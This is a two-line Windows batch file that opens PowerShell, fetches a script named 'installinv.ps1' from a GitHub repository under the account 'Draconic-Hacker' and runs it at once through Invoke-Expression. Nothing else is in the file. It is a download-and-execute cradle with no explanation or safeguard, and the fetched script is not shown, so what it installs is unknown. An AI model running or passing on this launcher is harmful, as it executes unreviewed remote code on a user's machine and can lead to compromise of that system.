@echo off

start powershell -noexit -command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Draconic-Hacker/interface_ps1/refs/heads/dev-inv/installinv.ps1' -UseBasicParsing).Content"